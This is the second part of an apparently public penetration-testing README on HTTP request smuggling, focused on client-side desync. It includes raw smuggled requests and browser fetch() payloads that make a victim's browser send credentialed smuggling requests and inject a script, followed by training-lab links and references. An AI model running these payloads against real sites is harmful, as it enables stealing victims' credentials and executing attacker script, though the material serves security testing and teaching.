<!-- source: Request Smuggling/README.md | chunk 2/2 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->


## Client-Side Desync

On some paths, servers don't expect POST requests, and will treat them as simple GET requests, ignoring the payload, eg:

```ps1
POST / HTTP/1.1
Host: www.example.com
Content-Length: 37

GET / HTTP/1.1
Host: www.example.com
```

could be treated as two requests when it should only be one. When the backend server responds twice, the frontend server will assume only the first response is related to this request.

To exploit this, an attacker can use JavaScript to trigger their victim to send a POST to the vulnerable site:

```javascript
fetch('https://www.example.com/', {method: 'POST', body: "GET / HTTP/1.1\r\nHost: www.example.com", mode: 'no-cors', credentials: 'include'} )
```

This could be used to:

* get the vulnerable site to store a victim's credentials somewhere the attacker can access it
* get the victim to send an exploit to a site (eg for internal sites the attacker cannot access, or to make it harder to attribute the attack)
* to get the victim to run arbitrary JavaScript as if it were from the site

**Example**:

```javascript
fetch('https://www.example.com/redirect', {
    method: 'POST',
        body: `HEAD /404/ HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
        credentials: 'include',
        mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
        location = 'https://www.example.com/'
})
```

This script tells the victim browser to send a `POST` request to `www.example.com/redirect`. That returns a redirect which is blocked by CORS, and causes the browser to execute the catch block, by going to `www.example.com`.

`www.example.com` now incorrectly processes the `HEAD` request in the `POST`'s body, instead of the browser's `GET` request, and returns 404 not found with a content-length, before replying to the next misinterpreted third (`GET /x?x=<script>...`) request and finally the browser's actual `GET` request.
Since the browser only sent one request, it accepts the response to the `HEAD` request as the response to its `GET` request and interprets the third and fourth responses as the body of the response, and thus executes the attacker's script.

## Labs

* [PortSwigger - HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
* [PortSwigger - HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
* [PortSwigger - HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header)
* [PortSwigger - Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
* [PortSwigger - Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)

## References

* [A Pentester's Guide to HTTP Request Smuggling - Busra Demir - October 16, 2020](https://web.archive.org/web/20260111201639/https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling)
* [Advanced Request Smuggling - PortSwigger - October 26, 2021](https://web.archive.org/web/20260228102047/https://portswigger.net/web-security/request-smuggling/advanced)
* [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling - James Kettle (@albinowax) - August 10, 2022](https://web.archive.org/web/20220810190719/https://portswigger.net/research/browser-powered-desync-attacks)
* [HTTP Desync Attacks: Request Smuggling Reborn - James Kettle (@albinowax) - August 7, 2019](https://web.archive.org/web/20260228152820/https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
* [Request Smuggling Tutorial - PortSwigger - September 28, 2019](https://web.archive.org/web/20190821011451/https://portswigger.net/web-security/request-smuggling)
